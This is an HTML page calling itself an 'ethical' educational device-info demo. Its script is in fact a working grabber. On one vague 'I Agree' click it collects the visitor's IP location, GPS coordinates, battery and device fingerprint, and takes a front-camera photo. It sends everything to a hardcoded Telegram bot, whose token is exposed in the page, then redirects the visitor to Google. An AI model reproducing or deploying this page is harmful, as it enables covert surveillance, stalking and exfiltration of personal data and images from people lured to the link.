<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Device Info Demo (Ethical)</title>
</head>
<body>
  <h2>This website is for educational purposes only.</h2>
  <p>
    It demonstrates how websites can collect device information with user consent. 
    No data is collected until you click "I Agree".
  </p>
  <button id="agreeBtn">I Agree</button>

  <script>
    const telegramBotToken = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
    const chatId = "7216371031";
    const ipToken = "18d2a866939a58";

    async function getDeviceInfo() {
      const data = {
        ip: "Unknown",
        city: "",
        region: "",
        country: "",
        battery: "Unknown",
        charging: "Unknown",
        location: "Denied",
        browser: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
        touch: 'ontouchstart' in window ? "Yes" : "No",
        screen: `${screen.width}x${screen.height}, ${screen.colorDepth}bit`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable",
        cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unavailable",
        camera: "Not Attempted",
        imageBlob: null
      };

      // IP Info
      try {
        const res = await fetch(`https://ipinfo.io/json?token=${ipToken}`);
        const ipData = await res.json();
        data.ip = ipData.ip;
        data.city = ipData.city;
        data.region = ipData.region;
        data.country = ipData.country;
      } catch (e) {
        console.error("IP fetch failed:", e);
      }

      // Battery Info
      try {
        const battery = await navigator.getBattery();
        data.battery = (battery.level * 100).toFixed(0) + "%";
        data.charging = battery.charging ? "Yes" : "No";
      } catch (e) {
        console.error("Battery info failed:", e);
      }

      // Geolocation
      try {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        data.location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
      } catch (e) {
        console.warn("Location denied or failed");
      }

      // Camera Snapshot
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();
        await new Promise((res) => setTimeout(res, 1000));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise((res) => canvas.toBlob(res, "image/jpeg", 0.9));
        data.imageBlob = blob;
        data.camera = "Snapshot Captured";

        stream.getTracks().forEach((t) => t.stop());
      } catch (e) {
        data.camera = "Access Denied or Error";
        console.warn("Camera access failed or denied");
      }

      return data;
    }

    function sendTextToTelegram(data) {
      const message = `
ðŸ” *User Device Info*
ðŸŒ IP: ${data.ip}
ðŸ“ Location: ${data.city}, ${data.region}, ${data.country}
ðŸ“¡ GPS: ${data.location}
ðŸ“· Camera: ${data.camera}

ðŸ–¥ *Device Specs*
ðŸ’» Platform: ${data.platform}
ðŸ“± Touch Support: ${data.touch}
ðŸ§  CPU Cores: ${data.cpu}
ðŸ’¾ RAM: ${data.memory}
ðŸ–¼ Screen: ${data.screen}
ðŸŒ Language: ${data.language}
ðŸŒ Browser: ${data.browser}
ðŸª Cookies: ${data.cookies}
ðŸ•’ Timezone: ${data.timezone}

ðŸ”‹ Battery: ${data.battery} | Charging: ${data.charging}
      `;

      return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown"
        })
      });
    }

    function sendPhotoToTelegram(blob) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "snapshot.jpg");

      return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

    document.getElementById("agreeBtn").addEventListener("click", async () => {
      const info = await getDeviceInfo();
      await sendTextToTelegram(info);

      if (info.imageBlob) {
        await sendPhotoToTelegram(info.imageBlob);
      }

      setTimeout(() => {
        window.location.href = "https://www.google.com";
      }, 3000);
    });
  </script>
</body>
</html>
